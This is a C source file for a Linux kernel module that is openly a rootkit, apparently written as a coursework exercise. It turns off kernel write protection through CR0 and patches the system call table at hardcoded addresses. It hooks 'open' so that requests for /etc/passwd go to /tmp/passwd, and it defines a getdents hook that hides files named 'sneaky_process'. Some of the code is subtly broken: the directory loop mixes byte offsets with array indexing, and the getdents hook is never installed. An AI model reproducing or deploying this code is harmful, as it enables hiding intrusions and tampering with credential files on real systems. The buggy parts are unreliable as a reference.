#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>


// ?? to make sure that the “struct linux_dirent” is interpreted correctly ??
struct linux_dirent {
  u64            d_ino;     // inode number
  s64            d_off;     // offset to next linux_dirent
  unsigned short d_reclen;  // linux_dirent length
  char           d_name[];  // null-terminated filename
}; 


//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81073190;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073110;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;


//////////////////////////////
///   "open" system call
//////////////////////////////

// function ptr to original systen call "open" (token: __NR_open)
asmlinkage int (*sys_open) (const char *pathname, int flags);

// Define new "open"
asmlinkage int sneaky_open (const char *pathname, int flags)
{
  // if wants to call "open" on "/etc/passwd": substitue for "/tmp/passwd" instead!
  if (strcmp(pathname, "/etc/passwd") == 0) {
    copy_to_user((void *)pathname, "/tmp/passwd", 12); 
    // 12 = "/tmp/passwd"(11) + "\0"(1)
  }
  // return to the system "open"
  return sys_open(pathname, flags);
}


////////////////////////////
///  "getdents" system call
////////////////////////////

// function ptr for original call
asmlinkage int (*sys_getdents) (unsigned int fd,
				struct linux_dirent *dirp,
				unsigned int count);

// define new sneaky function
asmlinkage int sneaky_getdents (unsigned int fd,
				struct linux_dirent *dirp,
				unsigned int count) {
  // first call original getdents() to get all dirent structs
  int dirent_size = sys_getdents(fd, dirp, count);
  int examined_size = 0;
  int skipped_size = 0;

  // iterate through "dirp ",
  // skip: any dirent with filename == "sneaky_process"
  // the trick for "skip" is: memmove all the dirents that are un-examined to the location of the current dirent
  int i; // ??? "forbids var declaration in for loop"??
  for (i = 0; i < (dirent_size - skipped_size);) {
    if (strcmp(dirp[i].d_name, "sneaky_process") == 0) {
      skipped_size += (int)(dirp[i].d_reclen);
      
      void* unexamined_start;
      unexamined_start = (void*)(&dirp[i]) + dirp[i].d_reclen;

      int unexamined_size;
      unexamined_size = dirent_size - examined_size - skipped_size;

      memmove((void*)(&dirp[i]),
	      unexamined_start,
	      unexamined_size);
      // i stays the same here, do not update!
      
    } else {
      examined_size += (int)(dirp[i].d_reclen);
      
      // update i here
      i +=  (int)(dirp[i].d_reclen);
    }
  }
  
  return dirent_size - skipped_size;
}



////////////////////////////////
///  module load/unload routine
////////////////////////////////

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  ///////////////////
  //  preparations
  ///////////////////
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  
  // Get ptr to sys_call_table
  page_ptr = (struct page *)virt_to_page(&sys_call_table);

  // Make this page read-write accessible
  pages_rw(page_ptr, 1);


  /////////////////////////////
  // change system call table
  /////////////////////////////

  // substitute "open" system call (token: __NR_open )
  sys_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_open;


  ////////////////////
  ///  clean-ups
  ////////////////////

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  ////////////////////
  ///  preparations
  ////////////////////
  
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // get ptr to system call page
  page_ptr = (struct page *)virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);
  

  //////////////////////////////////////////////////////////////////////
  ///  recover system call table with saved original function pointers
  //////////////////////////////////////////////////////////////////////

  // recover original "open" system call (token: __NR_open )
  *(sys_call_table + __NR_open) = (unsigned long)sys_open;


  /////////////////
  ///  clean-ups
  /////////////////
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

